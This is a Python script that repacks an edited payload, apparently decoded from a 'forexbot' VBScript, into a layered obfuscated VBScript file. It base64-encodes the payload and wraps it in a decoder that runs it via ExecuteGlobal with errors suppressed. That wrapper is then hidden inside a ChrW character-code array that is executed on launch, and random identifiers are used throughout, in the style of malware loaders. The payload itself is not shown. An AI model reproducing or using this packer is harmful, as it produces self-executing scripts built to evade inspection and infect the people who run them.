# Encode the edited payload back to obfuscated VBScript
import base64

# ============================================================================
# STEP 1: Read the edited final payload
# ============================================================================
with open(r'c:\Users\tawk2\Downloads\forexbot\vbs\decoded_layer2.txt', 'r', encoding='utf-8') as f:
    final_payload = f.read()

print("=" * 80)
print("STEP 1: Read edited final payload")
print("=" * 80)
print(final_payload)
print()

# ============================================================================
# STEP 2: Base64 encode the payload
# ============================================================================
payload_bytes = final_payload.encode('utf-8')
base64_encoded = base64.b64encode(payload_bytes).decode('utf-8')

print("=" * 80)
print("STEP 2: Base64 encode the payload")
print("=" * 80)
print(base64_encoded)
print()

# ============================================================================
# STEP 3: Create VBScript wrapper with base64 string and decoder functions
# ============================================================================
vbs_wrapper = 'Option Explicit\n'
vbs_wrapper += 'On Error Resume Next\n\n'
vbs_wrapper += 'Dim gzipfakw\n'
vbs_wrapper += f'gzipfakw = "{base64_encoded}"\n\n'
vbs_wrapper += 'ExecuteGlobal yfidvgbi(gzipfakw)\n\n'
vbs_wrapper += 'Function yfidvgbi(s)\n'
vbs_wrapper += '    Dim taaderss, rtjixbgl\n'
vbs_wrapper += '    Set taaderss = CreateObject("MSXML2.DOMDocument.6.0")\n'
vbs_wrapper += '    Set rtjixbgl = taaderss.createElement("tmp")\n'
vbs_wrapper += '    rtjixbgl.DataType = "bin.base64"\n'
vbs_wrapper += '    rtjixbgl.text = s\n'
vbs_wrapper += '    yfidvgbi = zcobjqba(rtjixbgl.nodeTypedValue)\n'
vbs_wrapper += 'End Function\n\n'
vbs_wrapper += 'Function zcobjqba(bytes)\n'
vbs_wrapper += '    Dim klqixhws, data\n'
vbs_wrapper += '    If VarType(bytes) = 0 Then\n'
vbs_wrapper += '        zcobjqba = ""\n'
vbs_wrapper += '        Exit Function\n'
vbs_wrapper += '    End If\n\n'
vbs_wrapper += '    Set klqixhws = CreateObject("ADODB.Stream")\n'
vbs_wrapper += '    klqixhws.Type = 1\n'
vbs_wrapper += '    klqixhws.Open\n'
vbs_wrapper += '    klqixhws.Write bytes\n'
vbs_wrapper += '    klqixhws.Position = 0\n'
vbs_wrapper += '    klqixhws.Type = 2\n'
vbs_wrapper += '    klqixhws.Charset = "UTF-8"\n'
vbs_wrapper += '    zcobjqba = klqixhws.ReadText\n'
vbs_wrapper += '    klqixhws.Close\n'
vbs_wrapper += '    Set klqixhws = Nothing\n'
vbs_wrapper += 'End Function\n\n'
vbs_wrapper += "' Clean up" + "\n"
vbs_wrapper += 'gzipfakw = ""\n'

print("=" * 80)
print("STEP 3: Create VBScript wrapper")
print("=" * 80)
print(f"Wrapper length: {len(vbs_wrapper)} characters")
print()

# ============================================================================
# STEP 4: Convert VBScript wrapper to ChrW codes
# ============================================================================
char_codes = [ord(c) for c in vbs_wrapper]

print("=" * 80)
print("STEP 4: Convert to ChrW codes")
print("=" * 80)
print(f"Total codes: {len(char_codes)}")
print()

# ============================================================================
# STEP 5: Format as VBScript array with line continuations
# ============================================================================
array_lines = []
current_line = "  "
count = 0

for i, code in enumerate(char_codes):
    # Don't add comma after the last element
    if i == len(char_codes) - 1:
        current_line += str(code)
    else:
        current_line += str(code) + ", "
    count += 1
    
    # Add line continuation every ~25 codes
    if count >= 25:
        current_line = current_line.rstrip() + " _"
        array_lines.append(current_line)
        current_line = "          "
        count = 0

# Add the last line
current_line = current_line.rstrip() + " _"
array_lines.append(current_line)

print("=" * 80)
print("STEP 5: Format as VBScript array")
print("=" * 80)
print(f"Total array lines: {len(array_lines)}")
print()

# ============================================================================
# STEP 6: Build final VBScript file
# ============================================================================
final_vbs = "' 2026-05-22 10:44:51\n\n"
final_vbs += "Option Explicit\n\n"
final_vbs += "Dim oJHOKXsHo\n"
final_vbs += "oJHOKXsHo = Array( _\n"
final_vbs += "\n".join(array_lines) + "\n"
final_vbs += ")\n\n"
final_vbs += "Dim sBhyhLG : sBhyhLG = \"\"\n"
final_vbs += "Dim jHEwICb\n"
final_vbs += "For Each jHEwICb In oJHOKXsHo\n"
final_vbs += "  sBhyhLG = sBhyhLG & ChrW(jHEwICb)\n"
final_vbs += "Next\n\n"
final_vbs += "Execute sBhyhLG\n"

# ============================================================================
# STEP 7: Save final encoded file
# ============================================================================
with open(r'c:\Users\tawk2\Downloads\forexbot\vbs\encoded_edited.vbs', 'w', encoding='utf-8') as f:
    f.write(final_vbs)

print("=" * 80)
print("STEP 6: Build and save final VBScript")
print("=" * 80)
print(f"File length: {len(final_vbs)} characters")
print()
print("Saved to: encoded_edited.vbs")
print("=" * 80)
